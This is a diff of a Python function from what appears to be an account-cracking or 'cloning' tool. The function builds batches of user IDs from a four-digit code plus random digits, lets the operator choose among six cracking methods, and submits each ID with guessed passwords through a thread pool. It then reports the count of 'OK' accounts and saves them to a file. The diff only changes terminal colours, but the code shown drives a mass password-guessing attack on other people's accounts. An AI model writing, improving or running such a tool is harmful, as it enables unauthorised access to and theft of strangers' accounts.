@@ -635,23 +635,23 @@ def SUMON2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[+] ENTER YOUR FOUR DIGIT CODE EX-6377')
+    print('\033[1;32m[+] ENTER YOUR FOUR DIGIT CODE EX-6377')
     print(f'{yellow}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    kode = input('[+] INPUT CODE : ')
+    kode = input('\033[1;32m[+] INPUT CODE : ')
     print(f'{yellow}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    limit = int(input('[+] LIMIT CLONE : '))
+    limit = int(input('\033[1;32m[+] LIMIT CLONE : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(6))
         user.append(nmp)
     clear()
     print("                CHOOSE METHOD                       ")
     print(f'{yellow}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    print(" [1] METHOD (1) ")
-    print(" [2] METHOD (2) ")
-    print(" [3] METHOD (3) ")
-    print(" [4] METHOD (4) ")
-    print(" [5] METHOD (5) ")
-    print(" [6] METHOD (6) ")
+    print("\033[1;32m[1] METHOD (1) ")
+    print("\033[1;32m[2] METHOD (2) ")
+    print("\033[1;32m[3] METHOD (3) ")
+    print("\033[1;32m[4] METHOD (4) ")
+    print("\033[1;32m[5] METHOD (5) ")
+    print("\033[1;32m[6] METHOD (6) ")
     linex()
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
@@ -666,8 +666,8 @@ def SUMON2():
         clear()
         SUMON_time()
         tl = str(len(user))
-        print(f"[✓] YOUR LIMIT UID  : "+tl+" ")
-        linex();print(' MODE ON/OFF (\033[1;32mAIRPLANE\033[1;32m)  ');linex()
+        print(f"\033[1;32m[✓] YOUR LIMIT UID  : "+tl+" ")
+        linex();print('\033[1;32m MODE ON/OFF (\033[1;32mAIRPLANE\033[1;32m)  ');linex()
         for guru in user:
             uid = kode+guru
             mk = uid[:6]
@@ -681,9 +681,9 @@ def SUMON2():
             else:
                 SUMON_xd.submit(p,uid,pwx,tl)
     linex()
-    print('[â] CRACK PROCESS COMPLETE')
-    print('[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
-    print('[â] ID SAVE SUMON-OK TXT')
+    print('\033[1;32m[â] CRACK PROCESS COMPLETE')
+    print('\033[1;32m[â] TOTAL OK ACCOUNTS : '+str(len(oks)))
+    print('\033[1;32m[â] ID SAVE SUMON-OK TXT')
     linex()
 
 def SUMON3():
